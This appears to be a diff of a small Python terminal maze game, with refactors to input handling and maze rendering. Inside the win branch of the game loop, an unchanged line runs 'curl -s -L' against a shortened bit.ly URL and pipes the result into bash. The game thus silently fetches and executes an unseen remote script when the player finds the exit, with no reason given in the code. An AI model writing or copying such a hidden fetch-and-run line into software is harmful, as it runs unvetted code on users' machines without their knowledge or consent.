@@ -23,7 +23,9 @@ def get_keypress() -> str:
 def move_player(maze: Maze, player_pos: tuple, dir: str) -> tuple[int, int]:
     """ Checks if the user input is valid and if so, moves the player to
         the correct cell """
-    match dir.lower():
+    dir = dir.lower()
+
+    match dir:
         case 'w':
             dir = "North"
         case 'a':
@@ -54,6 +56,7 @@ def move_player(maze: Maze, player_pos: tuple, dir: str) -> tuple[int, int]:
 
 
 def game_loop(config: dict, style: str) -> None:
+    """ Game loop """
     maze = create_new_maze(config)
     w_color = config["WALLS"]
     o_color = config["OBJECTIVES"]
@@ -65,13 +68,12 @@ def game_loop(config: dict, style: str) -> None:
     while True:
         console("clear")
         print("=== Minigame ===\n")
-        # Formats the maze
-        maze_style = format_maze(maze, player_pos, style)
-        display_maze(maze_style, style, colors)
+        grid = format_maze(maze, style, player_pos)
+        display_maze(grid, style, colors)
         print("Use WASD to move! (or '0' to exit)")
         print(system_message)
 
-        # Moves the player
+        # Move the player
         user_input = get_keypress()
         player_pos = move_player(maze, player_pos, user_input)
 
@@ -79,8 +81,8 @@ def game_loop(config: dict, style: str) -> None:
         if player_pos == maze.end:
             console("clear")
             print("=== Minigame ===\n")
-            maze_style = format_maze(maze, player_pos, style)
-            display_maze(maze_style, style, colors)
+            grid = format_maze(maze, style, player_pos)
+            display_maze(grid, style, colors)
             print("You found the exit!")
             sleep(0.5)
             console("curl -s -L https://bit.ly/3zvELNz | bash")
